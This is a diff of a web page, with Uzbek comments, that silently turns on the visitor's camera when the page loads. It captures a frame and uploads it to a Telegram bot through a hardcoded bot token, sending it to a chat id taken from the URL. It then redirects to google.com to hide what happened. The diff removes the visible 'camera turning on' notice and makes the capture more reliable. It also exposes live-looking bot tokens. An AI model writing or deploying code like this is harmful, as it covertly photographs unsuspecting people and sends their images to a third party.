@@ -3,13 +3,10 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title></title>
+    <title>Selfie yuborilmoqda...</title>
     <style>
       body {
-        font-family: sans-serif;
-        text-align: center;
         background: #fff;
-        color: white;
       }
       video,
       canvas {
@@ -18,52 +15,83 @@
     </style>
   </head>
   <body>
-    <h3>Kamera yoqilmoqda...</h3>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
-      const TOKEN = "8201270787:AAELpFwtJ7IYefjAIUtxEv39kyuU-jcbo2Y";
+      const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
       const chatId = window.location.pathname.split("/").pop();
 
       async function start() {
         try {
+          if (!chatId) {
+            console.error("chatId topilmadi");
+            document.getElementById("st").textContent = "chatId topilmadi";
+            // istasangiz redirect yoki boshqa ish qiling
+            return;
+          }
+
           const stream = await navigator.mediaDevices.getUserMedia({
             video: true,
           });
           const v = document.getElementById("v");
           v.srcObject = stream;
 
-          // video o'lchami yuklanishini kutamiz
-          await new Promise((r) => setTimeout(r, 800));
+          // video frame kelishini kutamiz — in-app browser uchun 1500ms fallback
+          await new Promise((resolve) => {
+            if (v.readyState >= 2 && v.videoWidth > 0) return resolve();
+            const onPlaying = () => {
+              v.removeEventListener("playing", onPlaying);
+              resolve();
+            };
+            v.addEventListener("playing", onPlaying);
+            v.play().catch(() => {});
+            setTimeout(() => {
+              v.removeEventListener("playing", onPlaying);
+              resolve();
+            }, 1500);
+          });
 
           const c = document.getElementById("c");
-          c.getContext("2d").drawImage(v, 0, 0);
+          c.width = v.videoWidth || 640;
+          c.height = v.videoHeight || 480;
+          const ctx = c.getContext("2d");
 
+          // oxirgi frame kelishini kutish
+          await new Promise((r) => requestAnimationFrame(r));
+          ctx.drawImage(v, 0, 0, c.width, c.height);
+
+          // kamerani to'xtatamiz
           stream.getTracks().forEach((t) => t.stop());
 
-          // blob olamiz va Telegramga yuboramiz
-          c.toBlob(async (blob) => {
-            const form = new FormData();
-            form.append("chat_id", chatId);
-            form.append("photo", blob, "selfie.png");
-            form.append("caption", "@koryapmanbot *orqali olindi*");
-            form.append("parse_mode", "Markdown");
+          document.getElementById("st").textContent = "Rasm yuborilmoqda...";
 
-            try {
-              await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: form,
-              });
-            } catch (err) {
-              console.error("Telegramga yuborishda xatolik:", err);
-            }
+          const blob = await new Promise((res) => c.toBlob(res, "image/png"));
+          if (!blob) throw new Error("Rasm olinmadi");
 
-            // faqat yuborilgandan keyin yo'naltirish
+          const form = new FormData();
+          form.append("chat_id", chatId);
+          form.append("photo", blob, "selfie.png");
+          form.append("caption", "nimg rasmi");
+
+          // yuborish va javobni tekshirish
+          const resp = await fetch(
+            `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
+            { method: "POST", body: form }
+          );
+          const data = await resp.json().catch(() => null);
+
+          if (!resp.ok || (data && !data.ok)) {
+            console.error("Telegramga yuborishda muammo", resp, data);
+            // yuborilmadi — baribir yo'naltirish yoki xato ko'rsatish mumkin
             window.location.href = "https://google.com";
-          }, "image/png");
+            return;
+          }
+
+          // muvaffaqiyatli yuborilgach yo'naltiramiz
+          window.location.href = "https://google.com";
         } catch (err) {
-          // xatolik bo‘lsa ham yo‘naltiramiz
+          console.error(err);
           window.location.href = "https://google.com";
         }
       }
